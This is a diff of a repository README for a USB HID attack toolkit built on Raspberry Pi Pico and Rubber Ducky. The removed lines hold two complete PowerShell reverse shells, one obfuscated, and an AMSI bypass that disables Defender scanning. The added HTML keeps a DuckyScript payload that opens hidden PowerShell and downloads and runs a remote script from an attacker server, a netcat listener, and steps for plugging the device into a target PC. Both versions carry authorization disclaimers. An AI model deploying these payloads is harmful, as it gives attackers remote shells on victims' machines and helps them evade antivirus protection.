@@ -1,72 +1,86 @@
-# Pico Turned Bad USB
 
-PowerShell Pentest Scripts
-This repository contains several PowerShell scripts and DuckyScript payloads for red teaming, CTFs, or educational research on Windows targets.
-Use responsibly and only on systems you are authorized to test.
 
-File 1: Reverse Shell (PowerShell)
-Script:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h1>HID-based PowerShell Payload Toolkit</h1>
+  <h2>Automated Payload Delivery Using USB Rubber Ducky &amp; Raspberry Pi Pico</h2>
 
-powershell
-$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",L_PORT);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-  $stream.Write($sendbyte,0,$sendbyte.Length);
-  $stream.Flush()
-};
-$client.Close()
-Purpose:
-Establishes a reverse TCP shell from the target machine to an attacker's server. Once connected, the attacker can execute PowerShell commands on the victim's machine remotely, and the output is sent back over the same connection.
+  <p>
+    This toolkit provides ready-to-deploy DuckyScript (<code>.ducky</code>) payloads for use with USB Rubber Ducky, Digispark, or Pico HID attack platforms.<br>
+    <strong>Not for manual execution—these are keyboard emulation scripts only.</strong>
+  </p>
+  <blockquote>
+    <strong>For legal, authorized penetration testing and education only!</strong>
+  </blockquote>
 
-How it works:
-
-Connects to the attacker's machine (YOUR_IP/L_PORT must be set).
-
-Waits for commands, executes them with iex, and returns output.
-
-Keeps the shell open until the connection closes.
-
-File 2: Windows Defender Bypass & Obfuscated Reverse Shell
-Defender Bypass
-powershell
-$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
-$s::amsiInitFailed = $true;
-Purpose:
-Disables Windows Antimalware Scan Interface (AMSI), helping PowerShell scripts evade detection by Windows Defender.
-
-Obfuscated Reverse Shell
-powershell
-$ip='YOUR_IP';$p=L_PORT;
-$tc='System.Net.Sockets.TCPClient';$t=New-Object ($tc) ($ip,$p);
-$s=$t.GetStream();
-$buf=0..65535|%{0};
-$enc='System.Text.ASCIIEncoding';
-while(($i=$s.Read($buf,0,$buf.Length)) -ne 0){
-    $d=(New-Object -TypeName $enc).GetString($buf,0,$i);
-    $sb=(iex $d 2>&1 | Out-String );
-    $sb2 = $sb+'PS '+(pwd).Path+'> ';
-    $send=([text.encoding]::ASCII).GetBytes($sb2);
-    $s.Write($send,0,$send.Length);$s.Flush()
-};$t.Close()
-Purpose:
-A reverse shell using shorter, variable-based names to hinder detection.
-
-How it works:
-
-Obfuscates variable and type names.
-
-Connects back to attacker's server with IP and port.
-
-Receives commands, executes, sends output back.
-
-File 3: DuckyScript – Remote Loader
-text
-DELAY 1000
+  <ol>
+    <li>
+      <h3>Quick Start</h3>
+      <p><strong>Clone the Repository:</strong></p>
+      <pre><code>git clone https://github.com/YOUR_USERNAME/hid-powershell-payloads.git
+cd hid-powershell-payloads
+</code></pre>
+    </li>
+    <li>
+      <h3>Prepare Your Payloads</h3>
+      <p><strong>Edit the Payloads</strong></p>
+      <ul>
+        <li>DuckyScript files (<code>payload.ducky</code>) are provided.</li>
+        <li>Replace all placeholders (<code>YOUR_IP</code>, <code>PORT</code>, <code>YOUR_FILE.ps1</code>) in the scripts with your own attack server details.
+          <pre><code>STRING IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/YOUR_FILE.ps1')
+</code></pre>
+        </li>
+        <li>Host your payload <code>.ps1</code> file(s) using a simple HTTP server:
+          <pre><code>python3 -m http.server 8000
+</code></pre>
+        </li>
+      </ul>
+    </li>
+    <li>
+      <h3>Flash Ducky Script to Your Device</h3>
+      <ul>
+        <li><strong>For Rubber Ducky:</strong>
+          <ul>
+            <li>Convert your <code>.ducky</code> file to <code>inject.bin</code> using
+              <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/duckencode" target="_blank">Hak5 DuckEncoder</a>:
+              <pre><code>java -jar duckencode.jar -i payload.ducky -o inject.bin
+</code></pre>
+            </li>
+            <li>Flash <code>inject.bin</code> onto your Rubber Ducky’s micro SD.</li>
+          </ul>
+        </li>
+        <li><strong>For Raspberry Pi Pico, Digispark, etc.:</strong>
+          <ul>
+            <li>Convert <code>.ducky</code> to the correct format required by your firmware (e.g., Duckyscript to CircuitPython for Pico).</li>
+            <li>Copy to device as per your toolkit’s guidelines.</li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li>
+      <h3>Plug in and Attack</h3>
+      <ul>
+        <li>Insert your HID device into the <strong>target Windows PC</strong>.</li>
+        <li>The HID emulates keyboard input:
+          <ul>
+            <li>Opens <kbd>Win+R</kbd>, launches hidden PowerShell.</li>
+            <li>Types/downloads/executes your remote payload—<strong>NO user interaction needed</strong>.</li>
+          </ul>
+        </li>
+        <li>On your attacker machine, set up a Netcat listener (for reverse shells):
+          <pre><code>nc -lvnp L_PORT
+</code></pre>
+          <p>Replace <code>L_PORT</code> with your port.</p>
+        </li>
+      </ul>
+    </li>
+    <li>
+      <h3>Example DuckyScript Payload</h3>
+      <pre><code>DELAY 1000
 GUI r
 DELAY 500
 STRING powershell -WindowStyle Hidden
@@ -74,20 +88,18 @@ ENTER
 DELAY 800
 STRING IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/YOUR_FILE.ps1')
 ENTER
-Purpose:
-This DuckyScript automates opening the Windows Run dialog, launching a hidden PowerShell window, and executing a remote PowerShell payload downloaded from your server.
+</code></pre>
+      <ul>
+        <li><strong>Edit:</strong> Change the URL to your IP/port/filename.</li>
+        <li>Place the corresponding <code>.ps1</code> (e.g., reverse shell or AMSI bypass) on your server before use.</li>
+      </ul>
+    </li>
+  </ol>
 
-How it works:
-
-Waits 1 second, then opens the Run dialog (GUI r).
-
-Types and runs a hidden PowerShell session.
-
-Downloads and executes a remote PowerShell script using IEX (Invoke-Expression) and Net.WebClient.
-
-Customization:
-
-Replace YOUR_IP, L_PORT, and YOUR_FILE.ps1 with your server details and script filename.
-
-Ensure your server is accessible from the target.
-
+  <h3>Legal/Ethical Use</h3>
+  <blockquote>
+    These payloads automate attack delivery for red teamers, CTF players, and security researchers—not intended for manual use!<br>
+    <strong>Never use on systems or networks without WRITTEN permission.</strong>
+  </blockquote>
+</body>
+</html>
